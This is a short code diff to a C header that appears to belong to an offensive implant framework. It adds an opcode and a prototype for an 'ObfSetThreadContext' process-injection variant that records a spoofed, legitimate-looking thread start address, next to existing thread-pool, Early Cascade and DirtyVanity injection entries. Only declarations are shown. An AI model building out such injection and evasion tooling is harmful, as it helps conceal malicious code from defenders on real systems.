@@ -29,6 +29,7 @@ char * local_mirror_data(char * buffer, int length);
 #define PI_EXEC_TPDIRECT             0xB  /* SafeBreach TP_DIRECT forge + NtSetIoCompletion trigger */
 #define PI_EXEC_TPSTARTROUTINESTUB   0xC  /* SafeBreach worker start-routine stub */
 #define PI_EXEC_EARLYCASCADE         0xD  /* Outflank g_pfnSE_DllLoaded (.mrdata) + intra-process APC cascade; suspended fork&run only */
+#define PI_EXEC_OBFSETTHREADCONTEXT_F 0xE /* ObfSetThreadContext "module!function+0x##": profile-chosen start address */
 
 #define INJECT_ARCH_X86 0
 #define INJECT_ARCH_X64 1
@@ -53,6 +54,8 @@ char * remote_mirror_data(INJECTCONTEXT * context, char * buffer, int length);
 void populate_inject_context(INJECTCONTEXT * context, PROCESS_INFORMATION * pi, HANDLE hProcess, DWORD pid);
 /* tier-2 item7 techniques (inject_tier2.cpp) */
 BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter);
+/* legitStart = thread start address to record (NULL = the target's image entry) */
+BOOL inject_via_obfsetthreadcontext_hinted(INJECTCONTEXT * context, LPVOID legitStart, LPVOID lpStartAddress, LPVOID lpParameter);
 void dv_nursery_init(void);
 BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parameter, int plen);
 BOOL procinj_execute_has(BYTE opcode);
